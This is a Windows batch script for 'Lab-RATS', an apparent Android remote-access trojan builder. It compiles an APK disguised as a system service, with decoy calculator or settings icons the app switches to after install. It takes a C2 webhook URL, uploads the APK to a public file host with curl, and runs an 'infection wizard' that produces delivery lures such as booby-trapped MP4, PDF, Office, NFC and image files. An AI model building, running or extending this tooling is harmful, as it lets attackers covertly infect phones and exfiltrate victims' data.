@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

REM #################################################
REM #                   Lab-RATS                    #
#                                               #
#        Android APK BUILDER - Windows          #
#                v1.5.1 Hardened                #
#                                               #
#             Developed by: K4N3CO              #
#################################################

title Lab-RATS APK Builder v1.5.1 - by K4N3CO

REM Get script directory
set "SCRIPT_DIR=%~dp0"
set "PROJECT_DIR=%SCRIPT_DIR%.."
set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"

goto :main_menu

:print_banner
cls
echo [96m ┌───────────────────────────────────────────────────────────────────────┐[0m
echo [96m │                                  .-         .                         │[0m
echo [96m │                               ....-        :                          │[0m
echo [96m │                            -==--+:.+. ..  -..+:-+                     │[0m
echo [96m │                            ++---:+.-==+==#:.+---+#                    │[0m
echo [96m │                             :==---:+++++=++=**-:-:                    │[0m
echo [96m │                               --+++:-=+++++++-=                       │[0m
echo [96m │                  .-.         :--+==:++-:-**+-+-                       │[0m
echo [96m │                    -.     .==:--+:+++=++++++++#.                      │[0m
echo [96m │                    :-    =---=::-++.=:.=.-==+....                     │[0m
echo [96m │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │[0m
echo [96m │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │[0m
echo [96m │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │[0m
echo [96m │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │[0m
echo [96m │                .-=:  .---=++++-++++#####*++..::--. .                  │[0m
echo [96m │                 .--++.--:----=+---=-++#++==.       .                  │[0m
echo [96m │                   --------=--:=:-:-====+++-                           │[0m
echo [96m │                       .--++++--++:+++==:=+.                           │[0m
echo [96m │                        .:+++::::--:..:-+=                             │[0m
echo [96m │                       .--=+=-+-+    -:---*---                         │[0m
echo [96m │                                                                       │[0m
echo [96m │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │[0m
echo [96m │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │[0m
echo [96m │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │[0m
echo [96m │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │[0m
echo [96m │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │[0m
echo [96m │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │[0m
echo [96m │                                                                       │[0m
echo [96m │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │[0m
echo [96m │                                                                       │[0m
echo [96m │   The one's who MIND don't matter. The one's who MATTER don't mind.   │[0m
echo [96m │                         DEVELOPED BY K4N3CO                           │[0m
echo [96m │                               © 2026                                  │[0m
echo [96m └───────────────────────────────────────────────────────────────────────┘[0m
echo.
goto :eof

:check_requirements
echo [96m[*] Checking requirements...[0m
echo.
where java >nul 2>nul
if %errorlevel% neq 0 (
    echo [91m[!] Java is not installed.[0m
    exit /b 1
) else (
    echo [92m[✓] Java detected.[0m
)
where keytool >nul 2>nul
if %errorlevel% equ 0 (
    echo [92m[✓] keytool found[0m
)
echo.
goto :eof

:generate_keystore
set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"
set "KEY_ALIAS=lab-rats-key"
set "KEYSTORE_PASS=lab-rats123"
if exist "%KEYSTORE_PATH%" (
    if not "%AUTO_KEYSTORE%"=="1" (
        set /p "REGEN=    Keystore exists. Regenerate? (y/N): "
        if /i "!REGEN!"=="y" ( del "%KEYSTORE_PATH%" ) else ( goto :keystore_props )
    ) else ( goto :keystore_props )
)
echo [96m[*] Generating Android Signing Certificate...[0m
keytool -genkeypair -alias "%KEY_ALIAS%" -keyalg RSA -keysize 2048 -validity 9125 -keystore "%KEYSTORE_PATH%" -storepass "%KEYSTORE_PASS%" -keypass "%KEYSTORE_PASS%" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>nul
:keystore_props
echo storeFile=lab-rats-keystore.jks> "%PROJECT_DIR%\keystore.properties"
echo storePassword=%KEYSTORE_PASS%>> "%PROJECT_DIR%\keystore.properties"
echo keyAlias=%KEY_ALIAS%>> "%PROJECT_DIR%\keystore.properties"
echo keyPassword=%KEYSTORE_PASS%>> "%PROJECT_DIR%\keystore.properties"
goto :eof

:configure_app
echo [96m[*] App Configuration[0m
echo [95m[^>] Enter App Name [System Stability Service]:[0m
set /p "APP_NAME=    "
if "!APP_NAME!"=="" set "APP_NAME=System Stability Service"
set /p "PKG_NAME=    Enter Package ID [com.android.system.stability]: "
if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"
set /p "VERSION_NAME=    Enter Version Name [2.0]: "
if "!VERSION_NAME!"=="" set "VERSION_NAME=2.0"
set /p "MIN_SDK=    Enter Min SDK [21]: "
if "!MIN_SDK!"=="" set "MIN_SDK=21"

if exist "%PROJECT_DIR%\app\build.gradle" (
    powershell -Command "(Get-Content '%PROJECT_DIR%\app\build.gradle') -replace 'applicationId \"[^\"]+\"', 'applicationId \"!PKG_NAME!\"' | Set-Content '%PROJECT_DIR%\app\build.gradle'"
    powershell -Command "(Get-Content '%PROJECT_DIR%\app\build.gradle') -replace 'minSdk [0-9]+', 'minSdk !MIN_SDK!' | Set-Content '%PROJECT_DIR%\app\build.gradle'"
    powershell -Command "(Get-Content '%PROJECT_DIR%\app\build.gradle') -replace 'versionName \".*\"', 'versionName \"!VERSION_NAME!\"' | Set-Content '%PROJECT_DIR%\app\build.gradle'"
)
echo.
echo [95m[^>] Decoy Identity Selection[0m
echo [93m    (The app logo will transform into your selection immediately after install on device)[0m
echo     1. System Update (Gear)  2. Calculator
echo     3. Weather               4. Settings
echo     5. Lab-RATS Logo
set /p "DECOY_CHOICE=    Choice (Default 1): "
if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"
set /p "WEB_URL=    Enter C2 Webhook URL (Google Script or Render): "
if not "!WEB_URL!"=="" (
    powershell -Command "Add-Content '%PROJECT_DIR%\local.properties' '`nWEBHOOK_URL=!WEB_URL!'"
)
powershell -Command "Add-Content '%PROJECT_DIR%\local.properties' '`nDECOY_CHOICE=!DECOY_CHOICE!'"
goto :eof

:build_apk
cd /d "%PROJECT_DIR%"
call gradlew.bat clean assembleRelease --no-daemon > build_log.txt 2>&1
if exist "app\build\outputs\apk\release\app-release.apk" (
    if not exist "%SCRIPT_DIR%output" mkdir "%SCRIPT_DIR%output"
    copy /Y "app\build\outputs\apk\release\app-release.apk" "%SCRIPT_DIR%output\signed_v1.apk" >nul
    echo [92m[✓] Success: apk-builder\output\signed_v1.apk[0m
) else (
    echo [91m[!] BUILD FAILED. Check build_log.txt[0m
    pause
)
cd /d "%SCRIPT_DIR%"
goto :eof

:infection_wizard
call :print_banner
echo [91m[>] STRATEGIC_INFECTION_WIZARD[0m
call :check_requirements
set "AUTO_KEYSTORE=1"
call :generate_keystore
call :configure_app
call :build_apk
if not exist "output\signed_v1.apk" goto :main_menu
echo [93m[*] Uploading to Catbox.moe...[0m
powershell -Command "$resp = curl.exe -sS -F 'reqtype=fileupload' -F 'fileToUpload=@output\signed_v1.apk' https://catbox.moe/user/api.php; echo $resp" > temp_url.txt
set /p DOWNLOAD_URL=<temp_url.txt
del temp_url.txt
echo [92m[✓] Hosted: !DOWNLOAD_URL![0m
echo      1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite
echo      4. Dolby Audio     5. ADB Script    6. Bluetooth Push
echo      7. NFC NDEF Tag    8. Stego Image   9. PWA Bundle
echo      10. Office Word    11. Office Excel 12. Ghost GIF
set /p "VECTOR=      Choice: "
if "!VECTOR!"=="1" ( set "V=mp4" ) else if "!VECTOR!"=="2" ( set "V=pdf" ) else if "!VECTOR!"=="3" ( set "V=ics" ) else if "!VECTOR!"=="4" ( set "V=dolby" ) else if "!VECTOR!"=="5" ( set "V=adb" ) else if "!VECTOR!"=="6" ( set "V=vcf" ) else if "!VECTOR!"=="7" ( set "V=ndef" ) else if "!VECTOR!"=="8" ( set "V=stego" ) else if "!VECTOR!"=="9" ( set "V=pwa" ) else if "!VECTOR!"=="10" ( set "V=docx" ) else if "!VECTOR!"=="11" ( set "V=xlsx" ) else if "!VECTOR!"=="12" ( set "V=gif" )
call :generate_exploit_standalone "!V!" "!DOWNLOAD_URL!" "System_Update"
pause
goto :main_menu

:exploit_menu
call :print_banner
echo [95m[^>] Weaponized Payload Lab (Hardened Tier)[0m
echo     1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite
echo     4. Dolby Audio       5. ADB Script      6. Bluetooth Push
echo     7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle
echo     10. Office Word      11. Office Excel   12. Ghost GIF
echo     13. Return
set /p "E_CHOICE=    Choice: "
if "!E_CHOICE!"=="13" goto :main_menu
set "C2_URL=http://127.0.0.1:8080"
if "!E_CHOICE!"=="1" ( set "V=mp4" ) else if "!E_CHOICE!"=="2" ( set "V=pdf" ) else if "!E_CHOICE!"=="3" ( set "V=ics" ) else if "!E_CHOICE!"=="4" ( set "V=dolby" ) else if "!E_CHOICE!"=="5" ( set "V=adb" ) else if "!E_CHOICE!"=="6" ( set "V=vcf" ) else if "!E_CHOICE!"=="7" ( set "V=ndef" ) else if "!E_CHOICE!"=="8" ( set "V=stego" ) else if "!E_CHOICE!"=="9" ( set "V=pwa" ) else if "!E_CHOICE!"=="10" ( set "V=docx" ) else if "!E_CHOICE!"=="11" ( set "V=xlsx" ) else if "!E_CHOICE!"=="12" ( set "V=gif" )
call :generate_exploit_standalone "!V!" "!C2_URL!" "Manual_Lab"
pause
goto :exploit_menu

:generate_exploit_standalone
echo [96m[*] Producing payload...[0m
javac -d bin "%PROJECT_DIR%\app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
cd output
java -cp ..\bin com.labs.labrats.exploits.ExploitLab %~1 "%~2" "%~3"
cd ..
goto :eof

:show_help
echo [96m1-4 Build. 5 Standalone Lab. 6 Infection Wizard.[0m
pause
goto :main_menu

:main_menu
call :print_banner
echo     1. Start Build       2. Keystore Only     3. App Settings
echo     4. Requirements      5. Payload Lab       6. Infection Wizard
echo     7. Help              8. Exit
set /p "MENU_OPTION=    Choice: "
if "!MENU_OPTION!"=="1" ( call :check_requirements && call :generate_keystore && call :configure_app && call :build_apk )
if "!MENU_OPTION!"=="2" ( call :check_requirements && call :generate_keystore )
if "!MENU_OPTION!"=="3" ( call :configure_app )
if "!MENU_OPTION!"=="4" ( call :check_requirements && pause )
if "!MENU_OPTION!"=="5" ( call :exploit_menu )
if "!MENU_OPTION!"=="6" ( call :infection_wizard )
if "!MENU_OPTION!"=="7" ( call :show_help )
if "!MENU_OPTION!"=="8" ( exit /b 0 )
goto :main_menu
